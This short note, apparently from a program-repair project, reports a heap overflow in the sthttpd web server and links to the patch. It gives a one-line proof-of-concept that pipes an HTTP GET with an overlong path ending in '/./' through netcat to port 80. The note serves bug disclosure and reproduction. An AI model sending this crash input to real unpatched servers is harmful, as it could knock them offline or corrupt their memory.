APR triggered a heap overflow, you can see the issue and the patch by looking
at the merge request sent to the sthttpd developer: 
https://github.com/blueness/sthttpd/pull/4. 

To trigger the heap overflow, you can run the following command (assuming that sthttpd runs on port 80):

echo -e "GET /aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/./ HTTP/1.1\r\nHost: test.com\r\n\r\n" | nc localhost 80

